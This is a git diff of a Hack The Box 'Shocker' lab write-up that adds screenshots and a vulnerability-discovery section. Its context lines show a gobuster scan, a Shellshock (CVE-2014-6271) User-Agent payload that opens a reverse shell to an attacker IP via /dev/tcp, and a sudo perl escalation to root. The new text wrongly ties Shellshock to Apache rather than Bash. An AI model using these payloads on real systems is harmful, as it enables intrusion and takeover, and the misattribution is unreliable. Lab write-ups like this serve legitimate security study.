@@ -66,26 +66,26 @@ Then I focused on that path with extensions:
 gobuster dir -u http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh,pl,cgi
 ```
 
-![Gobuster Directory Brute Force](https://github.com/ibrahimAlbadrani/HTB_Shocker/blob/main/Gobuster%20Brute%20Force.png?raw=true]
+![Gobuster Directory Brute Force](https://raw.githubusercontent.com/ibrahimAlbadrani/HTB_Shocker/refs/heads/main/Gobuster%20Brute%20Force.png)
+
+
 Found:
 
 ```
 /cgi-bin/user.sh
 ```
 
-When I accessed it, it returned basic uptime output — a Bash CGI script.
+## Vulnerability Discovery
+
+While enumerating the /cgi-bin/ directory, I found a Bash script named user.sh. When I accessed it, it returned uptime information, which hinted that it was being executed server-side — a typical CGI behavior.
+
+Knowing the server was running Apache 2.4.18 (confirmed by Nmap and WhatWeb), i google it and found that it's vulnerable to (CVE-2014-6271).
+CVE-2014-6271 : known as Shellshock, which allowed remote code execution by injecting a malicious payload nt http headers like User-Agent. 
+
+![CVE-2014-6271](https://raw.githubusercontent.com/ibrahimAlbadrani/HTB_Shocker/refs/heads/main/CVE-2014-6271.png)
 
 ---
 
-## Exploitation – Shellshock (CVE-2014-6271)
-
-I tested Shellshock with:
-
-```bash
-curl -H "User-Agent: () { :; }; echo; /bin/id" http://shocker.htb/cgi-bin/user.sh
-```
-
-It responded with the UID of `www-data`. So it was vulnerable.
 
 ### Reverse Shell
 
@@ -95,6 +95,10 @@ I set up my listener:
 nc -lvnp 4444
 ```
 
+![listener](https://raw.githubusercontent.com/ibrahimAlbadrani/HTB_Shocker/refs/heads/main/Listener.png)
+
+
+
 Then launched the attack:
 
 ```bash
@@ -102,6 +106,8 @@ curl -H "User-Agent: () { :; }; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.71/44
 ```
 
 Got a shell as user `shelly`.
+
+![Shell](https://raw.githubusercontent.com/ibrahimAlbadrani/HTB_Shocker/refs/heads/main/Got%20a%20Shell.png)
 
 ---
 
@@ -129,8 +135,10 @@ I used:
 ```bash
 sudo perl -e 'exec "/bin/bash";'
 ```
-
 Confirmed with `whoami` — I was root.
+
+
+![Root](https://raw.githubusercontent.com/ibrahimAlbadrani/HTB_Shocker/refs/heads/main/Root.png)
 
 ---
 
